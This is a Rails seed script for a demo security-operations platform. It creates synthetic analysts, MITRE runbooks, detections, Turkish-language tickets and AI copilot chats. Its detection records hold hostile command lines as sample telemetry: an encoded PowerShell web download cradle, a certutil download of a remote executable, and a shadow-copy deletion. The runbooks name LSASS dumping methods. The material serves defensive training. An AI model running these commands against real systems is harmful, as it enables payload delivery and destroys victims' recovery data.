# frozen_string_literal: true
# Sentriq AI - Synthetic Security Telemetry Seed Data
puts "== Seeding Sentriq AI Synthetic Data =="

# 1. Clean previous demo data safely
AuditEvent.destroy_all
TicketNote.destroy_all
CopilotMessage.destroy_all
SourceReference.destroy_all
InvestigationNote.destroy_all
Investigation.destroy_all
Ticket.destroy_all
Evidence.destroy_all
Detection.destroy_all
KnowledgeChunk.destroy_all
KnowledgeDocument.destroy_all
User.destroy_all

# 2. Users
lead = User.create!(
  name: "Elena Vance",
  email: "elena.vance@sentriq.local",
  role: "lead_analyst",
  demo_token: "demo-lead-token-42"
)

analyst = User.create!(
  name: "Marcus Reed",
  email: "marcus.reed@sentriq.local",
  role: "analyst",
  demo_token: "demo-analyst-token-01"
)

senior = User.create!(
  name: "Zeynep Demir",
  email: "zeynep.demir@sentriq.local",
  role: "senior_analyst",
  demo_token: "demo-senior-token-99"
)
puts "-> Created 3 synthetic analyst users (Tokens: demo-analyst-token-01, demo-lead-token-42, demo-senior-token-99)"

# 3. Knowledge Documents (Internal Runbooks & MITRE Techniques)
doc_ps = KnowledgeDocument.create!(
  title: "RB-0105: Obfuscated PowerShell Execution & LOLBins",
  category: "runbook",
  external_reference: "MITRE T1059.001",
  content: <<~TEXT
    Adversaries frequently leverage PowerShell to execute malicious code, bypass execution policies, and download second-stage payloads. Common indicators include flags such as '-EncodedCommand' or '-Enc', which base64-encode Unicode strings to prevent static text signatures.

    Another common indicator is the invocation of System.Net.WebClient or Invoke-WebRequest within the command line arguments to pull dynamic scripts from external command-and-control servers directly into memory using IEX (Invoke-Expression).

    Standard SOC Response Triage:
    1. Decode the base64 payload to inspect the underlying commands.
    2. Check the parent process ancestry; legitimate administrative scripts are rarely spawned directly by Office applications such as winword.exe or excel.exe.
    3. Verify network destination IPs against threat intelligence.
    4. If malicious, perform network isolation on the host and revoke compromised credentials.
  TEXT
)

doc_cert = KnowledgeDocument.create!(
  title: "RB-0208: Living-off-the-Land Ingress Tool via CertUtil",
  category: "runbook",
  external_reference: "MITRE T1105",
  content: <<~TEXT
    CertUtil is a built-in Windows CLI utility designed for managing certificates. Attackers abuse CertUtil using the '-urlcache' and '-split' flags to download remote files, effectively turning it into an ingress tool.

    Legitimate usage of CertUtil rarely contacts arbitrary external IP addresses over HTTP/HTTPS to download executable files into temporary directories like C:\\Windows\\Temp or AppData.

    Standard SOC Response Triage:
    1. Inspect the source URL and download destination.
    2. Calculate the cryptographic hash of the downloaded binary and verify its digital signature.
    3. Block the staging domain/IP at the perimeter firewall.
    4. Isolate the affected host if the binary was subsequently executed.
  TEXT
)

doc_vss = KnowledgeDocument.create!(
  title: "RB-0414: Volume Shadow Copy Deletion (Inhibit System Recovery)",
  category: "runbook",
  external_reference: "MITRE T1490",
  content: <<~TEXT
    Ransomware families routinely attempt to disable or delete Volume Shadow Copies to prevent victims from restoring encrypted files without paying the ransom.

    The primary command employed is 'vssadmin.exe delete shadows /all /quiet', often chained with 'wmic shadowcopy delete' or 'bcdedit /set default bootstatuspolicy ignoreallfailures'.

    Standard SOC Response Triage:
    1. Treat any unauthorized shadow copy deletion as high-severity potential ransomware activity.
    2. Immediately contain the endpoint from the network to halt potential file encryption sprawl.
    3. Collect volatile memory and forensic disk snapshots.
  TEXT
)

doc_lsass = KnowledgeDocument.create!(
  title: "RB-0902: LSASS Memory Dumping & Credential Extraction",
  category: "runbook",
  external_reference: "MITRE T1003",
  content: <<~TEXT
    Adversaries attempt to dump Local Security Authority Subsystem Service (LSASS) process memory to harvest plaintext credentials, Kerberos tickets, and NTLM hashes.

    Techniques include procdump, comsvcs.dll mini-dumps, and native API calls with PROCESS_VM_READ and PROCESS_QUERY_INFORMATION rights.

    Standard SOC Response Triage:
    1. Identify the parent process and user context attempting memory access.
    2. Rotate credentials for any accounts logged on to the affected machine.
    3. Quarantine the source process and investigate lateral movement.
  TEXT
)
puts "-> Seeded 4 knowledge base runbooks with automatic paragraph chunking"

# 4. Synthetic Detections & Evidence Chains
# Detection 1: Encoded PowerShell from Word (Critical)
det1 = Detection.create!(
  title: "Suspicious Encoded PowerShell Spawned by Microsoft Word",
  description: "Microsoft Word (winword.exe) spawned an obfuscated PowerShell instance with hidden window flags and external web requests.",
  severity: "critical",
  status: "new",
  hostname: "WKSTN-FIN-089.corp.sentriq.internal",
  ip_address: "10.0.14.89",
  username: "finance_dept\\sarah.connor",
  process_name: "powershell.exe",
  process_id: 4928,
  parent_process_name: "winword.exe",
  parent_process_id: 3104,
  command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQA0AC8AcABheWxvYWQucHMxIik=",
  file_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  file_hash: "28e7e60cb53f191f6305a2fa34479e390c5fae46b9a8269d0337b51b32943265",
  triggered_at: 10.minutes.ago,
  assigned_to: analyst,
  sla_risk: false,
  raw_telemetry: {
    edr_agent_version: "6.4.2-sentriq",
    mitre_technique: "T1059.001",
    antivirus_verdict: "Heuristic.Script.Malicious"
  }
)

det1.evidences.create!([
  {
    evidence_type: "process_spawn",
    occurred_at: 10.minutes.ago,
    description: "winword.exe (PID 3104) spawned powershell.exe (PID 4928) with hidden window flags.",
    details: { parent_sha256: "98a123f...", user: "sarah.connor" }
  },
  {
    evidence_type: "network_connection",
    occurred_at: 9.minutes.ago,
    description: "powershell.exe connected outbound to external IP 198.51.100.14 on TCP port 8080.",
    details: { dest_ip: "198.51.100.14", dest_port: 8080, proto: "TCP", bytes_sent: 1420 }
  },
  {
    evidence_type: "file_write",
    occurred_at: 8.minutes.ago,
    description: "New executable file dropped: C:\\Users\\sarah.connor\\AppData\\Local\\Temp\\payload.ps1",
    details: { path: "C:\\Users\\sarah.connor\\AppData\\Local\\Temp\\payload.ps1", size_bytes: 4892 }
  }
])

# Detection 2: CertUtil Ingress Download (High, SLA Breached > 15 mins)
det2 = Detection.create!(
  title: "CertUtil Remote Ingress Download of Unsigned Executable",
  description: "CertUtil utility used with -urlcache and -split flags to download an executable into Windows Temp directory.",
  severity: "high",
  status: "new",
  hostname: "SRV-DC-02.corp.sentriq.internal",
  ip_address: "10.0.2.10",
  username: "SYSTEM",
  process_name: "certutil.exe",
  process_id: 8840,
  parent_process_name: "cmd.exe",
  parent_process_id: 7212,
  command_line: "certutil.exe -urlcache -split -f https://203.0.113.88/agent_update.exe C:\\Windows\\Temp\\svchost_update.exe",
  file_path: "C:\\Windows\\System32\\certutil.exe",
  file_hash: "a43e7789bcf2010892015fa6b7891234cde567891234567890abcdef12345678",
  triggered_at: 35.minutes.ago,
  assigned_to: nil,
  sla_risk: true,
  sla_breached_at: 20.minutes.ago,
  raw_telemetry: {
    edr_agent_version: "6.4.2-sentriq",
    mitre_technique: "T1105",
    alert_source: "Behavioral IOA"
  }
)

det2.evidences.create!([
  {
    evidence_type: "network_connection",
    occurred_at: 35.minutes.ago,
    description: "certutil.exe initiated outbound TLS handshake with 203.0.113.88:443.",
    details: { dest_ip: "203.0.113.88", port: 443 }
  },
  {
    evidence_type: "file_write",
    occurred_at: 34.minutes.ago,
    description: "File written to disk: C:\\Windows\\Temp\\svchost_update.exe (Unsigned binary).",
    details: { path: "C:\\Windows\\Temp\\svchost_update.exe", size: 1048576 }
  }
])

# Detection 3: Shadow Copy Deletion (High)
det3 = Detection.create!(
  title: "Ransomware Triage: Volume Shadow Copies Deletion via vssadmin",
  description: "vssadmin invoked with quiet delete flags to destroy volume restore points.",
  severity: "high",
  status: "new",
  hostname: "SRV-FILE-01.corp.sentriq.internal",
  ip_address: "10.0.5.20",
  username: "CORP\\adm_backup",
  process_name: "vssadmin.exe",
  process_id: 6604,
  parent_process_name: "wscript.exe",
  parent_process_id: 2196,
  command_line: "vssadmin.exe delete shadows /all /quiet",
  file_path: "C:\\Windows\\System32\\vssadmin.exe",
  file_hash: "7f4c91a0b3872c659e917d23f10928b5e28490a1f938d21c45e89123456789ab",
  triggered_at: 4.minutes.ago,
  assigned_to: senior,
  sla_risk: false,
  raw_telemetry: {
    edr_agent_version: "6.4.2-sentriq",
    mitre_technique: "T1490"
  }
)

det3.evidences.create!([
  {
    evidence_type: "process_spawn",
    occurred_at: 4.minutes.ago,
    description: "wscript.exe (PID 2196) invoked vssadmin.exe with delete shadows argument.",
    details: { parent: "wscript.exe", args: "delete shadows /all /quiet" }
  }
])

# Detection 4: Low priority benign admin check
det4 = Detection.create!(
  title: "Dünkü Rutin Yedekleme ve Arşiv Tatbikatı Kontrolü",
  description: "Zamanlanmış acil durum tatbikatı tamamlandı. Rutin PowerShell arşivleme betiği çalıştırıldı.",
  severity: "low",
  status: "open",
  hostname: "SRV-BACKUP-02.corp.sentriq.internal",
  ip_address: "10.0.12.12",
  username: "backup_service",
  process_name: "powershell.exe",
  process_id: 1840,
  parent_process_name: "taskeng.exe",
  parent_process_id: 890,
  command_line: "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup_drill.ps1",
  file_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  file_hash: "11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff",
  triggered_at: 15.minutes.ago,
  assigned_to: analyst,
  sla_risk: false,
  raw_telemetry: {
    edr_agent_version: "6.4.2-sentriq",
    mitre_technique: "T1059.001"
  }
)

puts "-> Created 4 synthetic detections with correlated evidence timelines"

# 5. Synthetic Tickets (Crucial for Triage & UI display!)
ticket1 = Ticket.create!(
  ticket_number: "TK-2026-001",
  title: "Kritik İncelenmesi Gereken Olay: Encoded PowerShell Ingress",
  description: "Microsoft Word (winword.exe) üzerinden tetiklenen gizli PowerShell komutu harici C2 sunucusuna (198.51.100.14) bağlanmayı denedi.",
  status: "pending_review",
  priority: "critical",
  assigned_agent: "Sentriq-Autonomous-SOC-Copilot",
  detection: det1,
  user: analyst,
  context_metadata: {
    "hostname" => det1.hostname,
    "ip_address" => det1.ip_address,
    "username" => det1.username,
    "process_name" => det1.process_name,
    "source_edr" => "Sentriq EDR v6.4",
    "trigger_reason" => "High-confidence LOLBin macro exploitation signature"
  },
  llm_analysis: {
    "confidence_score" => 94,
    "reasoning" => "Ofis uygulamasının doğrudan gizli parametrelerle PowerShell çalıştırması ve Base64 kodlu WebClient indirmesi kesin siber saldırı göstergesidir.",
    "mitre_technique" => "T1059.001",
    "recommended_action" => "Host İzolasyonu & AD Parola Sıfırlama"
  },
  agent_mode: "autonomous_agent"
)

ticket2 = Ticket.create!(
  ticket_number: "TK-2026-002",
  title: "LOLBin CertUtil Şüpheli İkili Dosya İndirmesi",
  description: "Domain Controller (SRV-DC-02) üzerinde CertUtil kullanılarak harici IP'den çalıştırılabilir dosya indirildi.",
  status: "open",
  priority: "high",
  assigned_agent: "Sentriq-Autonomous-SOC-Copilot",
  detection: det2,
  user: lead,
  context_metadata: {
    "hostname" => det2.hostname,
    "ip_address" => det2.ip_address,
    "username" => det2.username
  },
  llm_analysis: {
    "confidence_score" => 88,
    "reasoning" => "CertUtil -urlcache bayrağının geçici Temp dizinine dosya yazması MITRE T1105 Ingress Tool Transfer prosedürüyle örtüşmektedir."
  },
  agent_mode: "autonomous_agent"
)

ticket3 = Ticket.create!(
  ticket_number: "TK-2026-003",
  title: "Gölge Kopyaların Silinmesi Tespiti (Ransomware Hazırlığı)",
  description: "vssadmin delete shadows komutu ile sistem kurtarma noktaları hedef alındı.",
  status: "open",
  priority: "high",
  assigned_agent: "Sentriq-Autonomous-SOC-Copilot",
  detection: det3,
  user: senior,
  context_metadata: {
    "hostname" => det3.hostname,
    "ip_address" => det3.ip_address
  },
  llm_analysis: {
    "confidence_score" => 92,
    "reasoning" => "Ransomware şifreleme öncesi sistem geri yükleme imhası teşhis edilmiştir."
  },
  agent_mode: "autonomous_agent"
)

ticket4 = Ticket.create!(
  ticket_number: "TK-2026-004",
  title: "Rutin Yedekleme Tatbikatı Kontrol Kaydı",
  description: "Haftalık planlı tatbikat betiğinin çalışması başarıyla doğrulandı.",
  status: "resolved",
  priority: "low",
  assigned_agent: "Sentriq-Auto-Triage",
  detection: det4,
  user: analyst,
  human_reviewer: senior,
  human_decision: "approved_benign",
  human_decision_notes: "Planlı tatbikat takvimine uygundur, yanlış alarm kapatıldı.",
  human_reviewed_at: 10.minutes.ago,
  context_metadata: {
    "hostname" => det4.hostname
  },
  agent_mode: "autonomous_agent"
)

puts "-> Created 4 synthetic incident tickets with context and LLM analysis"

# 6. Ticket Notes
ticket1.ticket_notes.create!([
  {
    author_type: "agent",
    author_name: "Sentriq SOC Autonomous Agent",
    note_type: "finding",
    body: "🤖 [OTONOM ANALİZ]: Olay MITRE T1059.001 ile %94 güven puanıyla eşleşti. İlgili runbook: RB-0105. Host izolasyonu tavsiye edildi fakat Güvenlik Politikası gereği 'İnsan Onayı (Human-in-the-Loop)' bekleniyor."
  },
  {
    author_type: "human",
    author_name: "Marcus Reed",
    user: analyst,
    note_type: "comment",
    body: "Uç noktadaki sarah.connor kullanıcısı ile iletişime geçildi. Şüpheli bir fatura e-postasındaki Word belgesini açtığını bildirdi. Analiz onaylanıyor."
  }
])

# 7. Copilot Messages
CopilotMessage.create!([
  {
    detection: det1,
    ticket: ticket1,
    user: analyst,
    role: "avatar",
    content: "Merhaba Marcus! WKSTN-FIN-089 makinesinde tespit edilen kritik Base64 kodlu PowerShell olayını inceledim. Komut satırı incelendiğinde '198.51.100.14' adresinden zararlı betik indirildiği görülüyor. Bu makineyi hemen ağdan izole etmemi ister misiniz?"
  },
  {
    detection: det1,
    ticket: ticket1,
    user: analyst,
    role: "user",
    content: "Bu olayda tam olarak hangi kanıtlar var?"
  },
  {
    detection: det1,
    ticket: ticket1,
    user: analyst,
    role: "avatar",
    content: "Telemetri kayıtlarında 3 somut kanıt mevcut:\n1. winword.exe tarafından saat 10 dakika önce powershell.exe başlatıldı.\n2. 9 dakika önce harici 198.51.100.14 IP adresine giden TCP bağlantısı kuruldu.\n3. Temp dizinine 'payload.ps1' adında yeni bir betik yazıldı.\nMITRE T1059.001 kapsamında RB-0105 runbook'u ile tam uyumludur."
  }
])

# 8. Audit Events
AuditEvent.create!([
  {
    trackable: det1,
    user: analyst,
    action: "investigation_started",
    details: { analyst: analyst.name, source: "copilot_studio" },
    ip_address: "127.0.0.1"
  },
  {
    trackable: ticket1,
    user: nil,
    action: "ticket_created_by_agent",
    details: { agent: "Sentriq-Autonomous-SOC-Copilot", priority: "critical" },
    ip_address: "127.0.0.1"
  }
])

puts "== Seed complete! Sentriq AI ready for triage, AI investigation & copilot demo =="
